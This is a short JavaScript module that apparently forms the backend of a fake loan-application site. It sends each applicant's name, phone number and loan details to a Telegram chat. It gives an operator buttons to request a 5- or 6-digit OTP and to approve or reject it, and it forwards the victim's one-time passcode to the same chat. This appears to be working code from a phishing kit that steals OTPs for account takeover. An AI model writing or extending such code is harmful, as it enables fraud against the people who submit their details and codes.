import bot from "../bot/bot.js";

// 📄 APPLICATION MESSAGE
export const sendApplicationToTelegram = async (id, data) => {
  const message = `
📄 <b>New Loan Application</b>

🆔 ID: ${id}
👤 Name: ${data.name}
📞 Phone: ${data.phone}
💰 Amount: ${data.amount}
📅 Term: ${data.repayment}

Status: Pending
`;

  await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "📲 Request OTP (5)", callback_data: `otp_5_${id}` },
          { text: "📲 Request OTP (6)", callback_data: `otp_6_${id}` },
        ],
        [
          { text: "✅ Approve", callback_data: `approve_${id}` },
          { text: "❌ Reject", callback_data: `reject_${id}` },
        ],
      ],
    },
  });
};

// 🔐 OTP MESSAGE
export const sendOTPToTelegram = async (id, otp) => {
  const message = `
🔐 <b>OTP RECEIVED</b>

🆔 ID: ${id}
🔢 OTP: ${otp}
`;

  await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve OTP", callback_data: `approve_otp_${id}` },
          { text: "❌ Reject OTP", callback_data: `reject_otp_${id}` },
        ],
      ],
    },
  });
};